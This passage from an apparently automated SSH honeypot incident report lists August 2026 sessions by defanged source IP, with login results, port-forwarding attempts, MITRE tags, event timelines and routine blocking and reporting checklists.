| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 12:01 |
| **Last Seen** | 2026-08-20 12:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 12:01:46` | `cowrie.session.connect` |
| `2026-08-20 12:01:47` | `cowrie.client.version` |
| `2026-08-20 12:01:47` | `cowrie.client.kex` |
| `2026-08-20 12:01:50` | `cowrie.login.success` |
| `2026-08-20 12:01:51` | `cowrie.direct-tcpip.request` |
| `2026-08-20 12:01:52` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 12:01:52` | `cowrie.direct-tcpip.data` |
| `2026-08-20 12:01:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c32f5bfbdea

| Field | Detail |
|---|---|
| **Source IP** | `172.90.128[.]97` |
| **First Seen** | 2026-08-20 12:05 |
| **Last Seen** | 2026-08-20 12:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 12:05:00` | `cowrie.session.connect` |
| `2026-08-20 12:05:00` | `cowrie.client.version` |
| `2026-08-20 12:05:00` | `cowrie.client.kex` |
| `2026-08-20 12:05:02` | `cowrie.login.success` |
| `2026-08-20 12:05:02` | `cowrie.direct-tcpip.request` |
| `2026-08-20 12:05:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.90.128[.]97` to AbuseIPDB if not already reported
- [ ] Block `172.90.128[.]97` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e90e238003de

| Field | Detail |
|---|---|
| **Source IP** | `191.241.142[.]170` |
| **First Seen** | 2026-08-20 12:05 |
| **Last Seen** | 2026-08-20 12:05 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 12:05:14` | `cowrie.session.connect` |
| `2026-08-20 12:05:15` | `cowrie.client.version` |
| `2026-08-20 12:05:15` | `cowrie.client.kex` |
| `2026-08-20 12:05:18` | `cowrie.login.success` |
| `2026-08-20 12:05:18` | `cowrie.direct-tcpip.request` |
| `2026-08-20 12:05:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.241.142[.]170` to AbuseIPDB if not already reported
- [ ] Block `191.241.142[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e66bf11462b

| Field | Detail |
|---|---|
| **Source IP** | `191.241.142[.]170` |
| **First Seen** | 2026-08-20 12:05 |
| **Last Seen** | 2026-08-20 12:05 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 12:05:24` | `cowrie.session.connect` |
| `2026-08-20 12:05:25` | `cowrie.client.version` |
| `2026-08-20 12:05:25` | `cowrie.client.kex` |
| `2026-08-20 12:05:28` | `cowrie.login.success` |
| `2026-08-20 12:05:29` | `cowrie.direct-tcpip.request` |
| `2026-08-20 12:05:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.241.142[.]170` to AbuseIPDB if not already reported
- [ ] Block `191.241.142[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfb288c3f690

| Field | Detail |
|---|---|
| **Source IP** | `34.155.85[.]143` |
| **First Seen** | 2026-08-20 12:06 |
| **Last Seen** | 2026-08-20 12:07 |
| **Session Duration** | 51s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 12:06:23` | `cowrie.session.connect` |
| `2026-08-20 12:06:30` | `cowrie.client.version` |
| `2026-08-20 12:06:30` | `cowrie.client.kex` |
| `2026-08-20 12:06:49` | `cowrie.login.success` |
| `2026-08-20 12:07:06` | `cowrie.session.params` |
| `2026-08-20 12:07:06` | `cowrie.command.input` |
| `2026-08-20 12:07:14` | `cowrie.log.closed` |
| `2026-08-20 12:07:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.155.85[.]143` to AbuseIPDB if not already reported
- [ ] Block `34.155.85[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d33702d930f9

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 12:06 |
| **Last Seen** | 2026-08-20 12:06 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 12:06:39` | `cowrie.session.connect` |
| `2026-08-20 12:06:39` | `cowrie.client.version` |
| `2026-08-20 12:06:39` | `cowrie.client.kex` |
| `2026-08-20 12:06:42` | `cowrie.login.success` |
| `2026-08-20 12:06:56` | `cowrie.direct-tcpip.request` |
| `2026-08-20 12:06:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e911929a3251

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 12:12 |
| **Last Seen** | 2026-08-20 12:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 12:12:52` | `cowrie.session.connect` |
| `2026-08-20 12:12:52` | `cowrie.client.version` |
| `2026-08-20 12:12:52` | `cowrie.client.kex` |
| `2026-08-20 12:12:54` | `cowrie.login.success` |
| `2026-08-20 12:12:55` | `cowrie.direct-tcpip.request` |
| `2026-08-20 12:12:56` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 12:12:56` | `cowrie.direct-tcpip.data` |
| `2026-08-20 12:12:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09050d5e2217

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 12:17 |
| **Last Seen** | 2026-08-20 12:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 12:17:34` | `cowrie.session.connect` |
| `2026-08-20 12:17:34` | `cowrie.client.version` |
| `2026-08-20 12:17:34` | `cowrie.client.kex` |
| `2026-08-20 12:17:36` | `cowrie.login.success` |
| `2026-08-20 12:17:37` | `cowrie.direct-tcpip.request` |
| `2026-08-20 12:17:38` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 12:17:38` | `cowrie.direct-tcpip.data` |
| `2026-08-20 12:17:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8b82a5aaba0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 12:23 |
| **Last Seen** | 2026-08-20 12:24 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 12:23:53` | `cowrie.session.connect` |
| `2026-08-20 12:23:53` | `cowrie.client.version` |
| `2026-08-20 12:23:53` | `cowrie.client.kex` |
| `2026-08-20 12:23:56` | `cowrie.login.success` |
| `2026-08-20 12:24:02` | `cowrie.direct-tcpip.request` |
| `2026-08-20 12:24:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e7c53a4c7ea

| Field | Detail |
|---|---|
| **Source IP** | `101.13.4[.]124` |
| **First Seen** | 2026-08-20 12:23 |
| **Last Seen** | 2026-08-20 12:24 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 12:23:56` | `cowrie.session.connect` |
| `2026-08-20 12:23:57` | `cowrie.client.version` |
| `2026-08-20 12:23:57` | `cowrie.client.kex` |
| `2026-08-20 12:23:59` | `cowrie.login.success` |
| `2026-08-20 12:24:00` | `cowrie.direct-tcpip.request` |
| `2026-08-20 12:24:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.4[.]124` to AbuseIPDB if not already reported
- [ ] Block `101.13.4[.]124` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17fb55002354

| Field | Detail |
|---|---|
| **Source IP** | `187.126.105[.]42` |
| **First Seen** | 2026-08-20 12:24 |
| **Last Seen** | 2026-08-20 12:24 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 12:24:11` | `cowrie.session.connect` |
| `2026-08-20 12:24:12` | `cowrie.client.version` |
| `2026-08-20 12:24:12` | `cowrie.client.kex` |
| `2026-08-20 12:24:14` | `cowrie.login.success` |
| `2026-08-20 12:24:15` | `cowrie.direct-tcpip.request` |
| `2026-08-20 12:24:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.126.105[.]42` to AbuseIPDB if not already reported
- [ ] Block `187.126.105[.]42` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7f5220873ac

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 12:28 |
| **Last Seen** | 2026-08-20 12:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 12:28:29` | `cowrie.session.connect` |
| `2026-08-20 12:28:29` | `cowrie.client.version` |
| `2026-08-20 12:28:30` | `cowrie.client.kex` |
| `2026-08-20 12:28:31` | `cowrie.login.success` |
| `2026-08-20 12:28:33` | `cowrie.direct-tcpip.request` |
| `2026-08-20 12:28:35` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 12:28:35` | `cowrie.direct-tcpip.data` |
| `2026-08-20 12:28:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cb3a4a8ac2c

| Field | Detail |
|---|---|
| **Source IP** | `61.169.54[.]150` |
| **First Seen** | 2026-08-20 12:29 |
| **Last Seen** | 2026-08-20 12:29 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 12:29:21` | `cowrie.session.connect` |
| `2026-08-20 12:29:22` | `cowrie.client.version` |
| `2026-08-20 12:29:22` | `cowrie.client.kex` |
| `2026-08-20 12:29:25` | `cowrie.login.success` |
| `2026-08-20 12:29:26` | `cowrie.direct-tcpip.request` |
| `2026-08-20 12:29:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.169.54[.]150` to AbuseIPDB if not already reported
- [ ] Block `61.169.54[.]150` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36f3a024bc25

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-20 12:33 |
| **Last Seen** | 2026-08-20 12:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 12:33:58` | `cowrie.session.connect` |
| `2026-08-20 12:33:58` | `cowrie.client.version` |
| `2026-08-20 12:33:58` | `cowrie.client.kex` |
| `2026-08-20 12:33:59` | `cowrie.login.success` |
| `2026-08-20 12:33:59` | `cowrie.direct-tcpip.request` |
| `2026-08-20 12:33:59` | `cowrie.direct-tcpip.data` |
| `2026-08-20 12:33:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d78087e50f4

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 12:34 |
| **Last Seen** | 2026-08-20 12:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 12:34:58` | `cowrie.session.connect` |
| `2026-08-20 12:34:58` | `cowrie.client.version` |
| `2026-08-20 12:34:59` | `cowrie.client.kex` |
| `2026-08-20 12:35:00` | `cowrie.login.success` |
| `2026-08-20 12:35:02` | `cowrie.direct-tcpip.request` |
| `2026-08-20 12:35:04` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 12:35:04` | `cowrie.direct-tcpip.data` |
| `2026-08-20 12:35:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62fd2a1c55da

| Field | Detail |
|---|---|
| **Source IP** | `14.153.226[.]83` |
| **First Seen** | 2026-08-20 12:38 |
| **Last Seen** | 2026-08-20 12:38 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 12:38:37` | `cowrie.session.connect` |
| `2026-08-20 12:38:37` | `cowrie.client.version` |
| `2026-08-20 12:38:37` | `cowrie.client.kex` |
| `2026-08-20 12:38:40` | `cowrie.login.success` |
| `2026-08-20 12:38:41` | `cowrie.direct-tcpip.request` |
| `2026-08-20 12:38:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.153.226[.]83` to AbuseIPDB if not already reported
- [ ] Block `14.153.226[.]83` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9475011197f

| Field | Detail |
|---|---|
| **Source IP** | `172.90.128[.]97` |
| **First Seen** | 2026-08-20 12:38 |
| **Last Seen** | 2026-08-20 12:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 12:38:46` | `cowrie.session.connect` |
| `2026-08-20 12:38:47` | `cowrie.client.version` |
| `2026-08-20 12:38:47` | `cowrie.client.kex` |
| `2026-08-20 12:38:48` | `cowrie.login.success` |
| `2026-08-20 12:38:49` | `cowrie.direct-tcpip.request` |
| `2026-08-20 12:38:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.90.128[.]97` to AbuseIPDB if not already reported
- [ ] Block `172.90.128[.]97` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a6ffa6ca511

| Field | Detail |
|---|---|
| **Source IP** | `96.56.228[.]149` |
| **First Seen** | 2026-08-20 12:38 |
| **Last Seen** | 2026-08-20 12:38 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 12:38:50` | `cowrie.session.connect` |
| `2026-08-20 12:38:50` | `cowrie.client.version` |
| `2026-08-20 12:38:50` | `cowrie.client.kex` |
| `2026-08-20 12:38:51` | `cowrie.login.success` |
| `2026-08-20 12:38:51` | `cowrie.direct-tcpip.request` |
| `2026-08-20 12:38:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `96.56.228[.]149` to AbuseIPDB if not already reported
- [ ] Block `96.56.228[.]149` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0121fc1a1bf9

| Field | Detail |
|---|---|
| **Source IP** | `177.135.206[.]10` |
| **First Seen** | 2026-08-20 12:38 |
| **Last Seen** | 2026-08-20 12:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 12:38:57` | `cowrie.session.connect` |
| `2026-08-20 12:38:57` | `cowrie.client.version` |
| `2026-08-20 12:38:57` | `cowrie.client.kex` |
| `2026-08-20 12:38:59` | `cowrie.login.success` |
| `2026-08-20 12:39:00` | `cowrie.direct-tcpip.request` |
| `2026-08-20 12:39:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.135.206[.]10` to AbuseIPDB if not already reported
- [ ] Block `177.135.206[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fed38760334f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 12:39 |
| **Last Seen** | 2026-08-20 12:39 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 12:39:24` | `cowrie.session.connect` |
| `2026-08-20 12:39:25` | `cowrie.client.version` |
| `2026-08-20 12:39:25` | `cowrie.client.kex` |
| `2026-08-20 12:39:28` | `cowrie.login.success` |
| `2026-08-20 12:39:29` | `cowrie.direct-tcpip.request` |
| `2026-08-20 12:39:35` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 12:39:35` | `cowrie.direct-tcpip.data` |
| `2026-08-20 12:39:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff4bc0655772

| Field | Detail |
|---|---|
| **Source IP** | `27.107.102[.]154` |
| **First Seen** | 2026-08-20 12:41 |
| **Last Seen** | 2026-08-20 12:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 12:41:34` | `cowrie.session.connect` |
| `2026-08-20 12:41:34` | `cowrie.client.version` |
| `2026-08-20 12:41:34` | `cowrie.client.kex` |
| `2026-08-20 12:41:36` | `cowrie.login.success` |
| `2026-08-20 12:41:37` | `cowrie.direct-tcpip.request` |
| `2026-08-20 12:41:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.107.102[.]154` to AbuseIPDB if not already reported
- [ ] Block `27.107.102[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-057d80ae3dda

| Field | Detail |
|---|---|
| **Source IP** | `182.75.197[.]174` |
| **First Seen** | 2026-08-20 12:41 |
| **Last Seen** | 2026-08-20 12:41 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 12:41:42` | `cowrie.session.connect` |
| `2026-08-20 12:41:43` | `cowrie.client.version` |
| `2026-08-20 12:41:43` | `cowrie.client.kex` |
| `2026-08-20 12:41:45` | `cowrie.login.success` |
| `2026-08-20 12:41:46` | `cowrie.direct-tcpip.request` |
| `2026-08-20 12:41:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.197[.]174` to AbuseIPDB if not already reported
- [ ] Block `182.75.197[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-928a02d01568

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 12:46 |
| **Last Seen** | 2026-08-20 12:46 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 12:46:02` | `cowrie.session.connect` |
| `2026-08-20 12:46:02` | `cowrie.client.version` |
| `2026-08-20 12:46:03` | `cowrie.client.kex` |
| `2026-08-20 12:46:05` | `cowrie.login.success` |
| `2026-08-20 12:46:07` | `cowrie.direct-tcpip.request` |
| `2026-08-20 12:46:20` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 12:46:20` | `cowrie.direct-tcpip.data` |
| `2026-08-20 12:46:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a53264b2ca2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 12:50 |
| **Last Seen** | 2026-08-20 12:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 12:50:14` | `cowrie.session.connect` |
| `2026-08-20 12:50:14` | `cowrie.client.version` |
| `2026-08-20 12:50:14` | `cowrie.client.kex` |
| `2026-08-20 12:50:15` | `cowrie.login.success` |
| `2026-08-20 12:50:16` | `cowrie.direct-tcpip.request` |
| `2026-08-20 12:50:17` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 12:50:17` | `cowrie.direct-tcpip.data` |
| `2026-08-20 12:50:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `80.251.153[.]178` | **29** | 2026-08-20 10:55 | 2026-08-20 12:44 | 33m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **6** | 2026-08-20 10:55 | 2026-08-20 12:52 | 0m | 0 | `T1592` | 🟢 LOW |
